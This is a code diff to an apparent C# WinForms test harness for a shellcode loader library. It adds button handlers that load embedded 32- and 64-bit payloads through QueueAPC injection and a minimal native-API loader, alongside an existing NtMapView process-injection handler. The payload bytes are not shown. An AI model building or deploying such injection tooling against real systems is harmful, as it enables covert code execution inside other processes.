@@ -164,6 +164,29 @@ namespace Test
             }
         }
 
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            if (IntPtr.Size == 8)
+            {
+                ShellCodeLoader.QueueAPC cpp = new ShellCodeLoader.QueueAPC(PayloadCpp64.rawData);
+                ShellCodeLoader.QueueAPC csharp = new ShellCodeLoader.QueueAPC(PayloadCSharp64.rawData, true);
+                cpp.LoadWithQueueAPC();
+                csharp.LoadWithQueueAPC();
+                cpp.Dispose();
+                csharp.Dispose();
+            }
+            else
+            {
+                ShellCodeLoader.QueueAPC cpp = new ShellCodeLoader.QueueAPC(PayloadCpp32.rawData, true);
+                ShellCodeLoader.QueueAPC csharp = new ShellCodeLoader.QueueAPC(PayloadCSharp32.rawData, true);
+                cpp.LoadWithQueueAPC();
+                csharp.LoadWithQueueAPC();
+                cpp.Dispose();
+                csharp.Dispose();
+            }
+        }
+
         private void injectWithMapViewToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Process Target = Process.GetProcessesByName(listView1.SelectedItems[0].SubItems[1].Text)[0];
@@ -173,6 +196,30 @@ namespace Test
             csharp.LoadWithNtMapView();
             cpp.Dispose();
             csharp.Dispose();
+        }
+
+        private void button7_Click(object sender, EventArgs e)
+        {
+            if (IntPtr.Size == 8)
+            {
+                ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI cpp = new ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI(PayloadCpp64.rawData);
+                ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI csharp = new ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI(PayloadCSharp64.rawData);
+                cpp.Asynchronous = true;
+                csharp.Asynchronous = true;
+                cpp.LoadWithMinimalAPI();
+                csharp.LoadWithMinimalAPI();
+                cpp.Dispose();
+                csharp.Dispose();
+            }
+            else
+            {
+                ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI cpp = new ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI(PayloadCpp32.rawData);
+                ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI csharp = new ShellCodeLoader.ShellCodeLoaderMinimalNativeAPI(PayloadCSharp32.rawData);
+                cpp.LoadWithMinimalAPI();
+                csharp.LoadWithMinimalAPI();
+                cpp.Dispose();
+                csharp.Dispose();
+            }
         }
     }
 }
